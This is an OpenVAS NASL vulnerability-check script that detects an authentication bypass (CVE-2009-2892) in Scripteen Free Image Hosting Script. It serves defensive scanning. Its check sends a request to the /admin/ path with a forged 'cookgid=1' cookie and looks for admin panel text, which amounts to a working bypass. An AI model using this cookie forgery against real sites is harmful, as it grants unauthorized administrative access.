###############################################################################
# OpenVAS Vulnerability Test
# $Id: scripteen_multiple.nasl 15 2013-10-27 12:49:54Z jan $
#
# Scripteen Free Image Hosting Script Multiple Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Scripteen Free Image Hosting Script is prone to multiple SQL-injection
vulnerabilities and to an authentication-bypass vulnerability.

Exploiting these issues could allow an attacker to compromise the
application, access or modify data, exploit latent vulnerabilities
in the underlying database or to gain administrative access.

Scripteen Free Image Hosting Script 2.3 is vulnerable; other versions
may also be affected.";


if (description)
{
 script_id(100246);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-07-26 19:54:54 +0200 (Sun, 26 Jul 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-2892");
 script_bugtraq_id(35800,35801);
 script_tag(name:"risk_factor", value:"High");

 script_name("Scripteen Free Image Hosting Script Multiple Vulnerabilities");

desc = "

 Summary:
 " + tag_summary;


 script_description(desc);
 script_summary("Determine if Scripteen Free Image Hosting Script is prone to multiple Vulnerabilities");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/35800");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/35801");
 script_xref(name : "URL" , value : "http://www.scripteen.com/scripts/scripteen-free-image-hosting-script.html#more-10");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list(cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/login.php"); 
  buf = http_get_cache(item:url, port:port);

  if(egrep(pattern: "Scripteen Free Image Hosting Script", string: buf, icase: TRUE)) {

    req = string("GET ", dir, "/admin/ HTTP/1.1\r\n",
              "Host: ", get_host_name(), ":", port, "\r\n",
              "User-Agent: Mozilla/5.0 (OpenVAS; U; Linux i686; en-US; rv:1.7) Gecko/20040712",
              "Accept-Language: en-us,en,de;\r\n",
              "Cookie: cookgid=1\r\n",
              "Connection: close\r\n\r\n");

    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:0);

    if(egrep(pattern:"Admin Control Panel", string:buf) &&
       egrep(pattern:"Total Members", string:buf)       &&
       egrep(pattern:"Total images", string:buf)) {   
 
         security_hole(port:port);
         exit(0);
    }
  }
}

exit(0);
